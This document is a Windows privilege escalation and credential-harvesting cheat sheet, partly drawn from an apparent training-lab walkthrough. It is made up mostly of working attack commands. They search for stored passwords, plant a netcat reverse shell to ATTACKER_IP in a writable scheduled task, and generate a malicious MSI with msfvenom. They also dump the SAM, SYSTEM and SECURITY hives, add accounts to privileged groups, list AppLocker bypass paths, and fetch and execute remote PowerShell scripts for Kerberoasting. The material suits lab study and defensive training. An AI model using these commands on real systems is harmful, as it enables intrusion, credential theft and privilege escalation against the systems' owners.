# Windows

You may find some credentials about domain and password:  
•	`C:\Unattend.xml`  
•	`C:\Windows\Panther\Unattend.xml`  
•	`C:\Windows\Panther\Unattend\Unattend.xml`  
•	`C:\Windows\system32\sysprep.inf`  
•	`C:\Windows\system32\sysprep\sysprep.xml`  

### Powershell History
Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a cmd.exe prompt:  
`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`  
Note: The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable. To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 


### Saved Windows Credentials
Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:  
`cmdkey /list`  
While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.  
`runas /savecred /user:admin cmd.exe`


## IIS Configuration
Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:  
•	`C:\inetpub\wwwroot\web.config`  
•	`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`  
Here is a quick way to find database connection strings on the file:  
`type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`


### Retrieve Credentials from Software: PuTTY
To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:  
`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`


### Scheduled Tasks
Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.  
Scheduled tasks can be listed from the command line using the schtasks command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:  
Command Prompt   
```cmd
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```
        
You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.  
If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use icacls:  
Command Prompt   
```cmd
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
 ```
       
As can be seen in the result, the `BUILTIN\Users` group has full access (F) over the task's binary. This means we can modify the `.bat` file and insert any payload we like. For your convenience, `nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:  
Command Prompt  
```cmd
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
        
We then start a listener on the attacker machine on the same port we indicated on our reverse shell:  
`nc -lvp 4444`  
The next time the scheduled task runs, you should receive the reverse shell with `taskusr1` privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:  
Command Prompt   
```cmd
C:\> schtasks /run /tn vulntask
```
        
And you will receive the reverse shell with taskusr1 privileges as expected:  
Kali Linux   
```bash
user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```

### AlwaysInstallElevated
Windows installer files (also known as `.msi files`) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.  
Note: The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.  
This method requires two registry values to be set. You can query these from the command line using the commands below.  
Command Prompt  
```cmd
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
        
To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious `.msi` file using msfvenom, as seen below:  
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`  
As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:  
Command Prompt   
`C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`


## Basic Windows Enumeration

`systeminfo`  
`whoami /all`  
`net users`  
`net users <USERNAME>`  
`tasklist /SVC`  
`sc query`  
`sc qc <SERVICE>`  
`netsh firewall show state`  
`schtasks /query /fo LIST /v`  
`findstr /si password *.xml *.ini *.txt`  
`dir /s *pass* == *cred* == *vnc* == *.config*`  
`accesschk.exe -uws "Everyone" "C:\Program Files\"`  
`wmic qfe get Caption,Description,HotFixID,InstalledOn`  
`driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start`  


## AppLocker Bypass List

Bypass List (Windows 10 Build 1803):  
C:\Windows\Tasks  
C:\Windows\Temp  
C:\Windows\tracing  
C:\Windows\Registration\CRMLog  
C:\Windows\System32\FxsTmp  
C:\Windows\System32\com\dmp  
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys  
C:\Windows\System32\spool\PRINTERS  
C:\Windows\System32\spool\SERVERS  
C:\Windows\System32\spool\drivers\color  
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter  
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)  
C:\Windows\SysWOW64\FxsTmp  
C:\Windows\SysWOW64\com\dmp  
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter  
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System  

### Adding Users to Groups  
`net user <USERNAME> <PASSWORD> /add /domain`  
`net group "Exchange Windows Permissions" /add <USERNAME>`  
`net localgroup "Remote Management Users" /add <USERNAME>`  

## Privileges and Permissions  
AlwaysInstallElevated   
`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`  
`reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer`  
`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`  
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`  

## Backup SAM and SYSTEM Hashes  
`reg save hklm\system C:\Users\<USERNAME>\system.hive`  
`reg save hklm\sam C:\Users\<USERNAME>\sam.hive`  

## Enable Remote Desktop (RDP)
`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections netsh advfirewall firewall set rule group="remote desktop" new enable=yes`  

### Export System Registry Value
`reg save HKLM\SYSTEM c:\temp\system`  
`reg save hklm\sam C:\temp\sam`  

#### Search the Registry for Passwords
`reg query HKLM /f password /t REG_SZ /s`  
`reg query HKCU /f password /t REG_SZ /s`  

#### Dumping Credentials
`reg save hklm\system system`  
`reg save hklm\sam sam`  
`reg.exe save hklm\sam c:\temp\sam.save`  
`reg.exe save hklm\security c:\temp\security.save`  
`reg.exe save hklm\system c:\temp\system.save`  

---

`setspn -T medin -Q ​ */*` - we can extract all accounts in the SPN


`powershell -ep bypass;`  
`iex​(New-Object Net.WebClient).DownloadString('https://YOUR_IP/Invoke-Kerberoast.ps1')`

Now lets load this into memory: Invoke-Kerberoast -OutputFormat hashcat ​ |fl

You should get a SPN ticket.

---

 `PowerUp1.ps1` - into memory for enumerating any weakness to abuse for local privilege escalation.

`powershell -ep bypass;`
`iex​(New-Object Net.WebClient).DownloadString('http://YOUR_IP/PowerUp.ps1')`
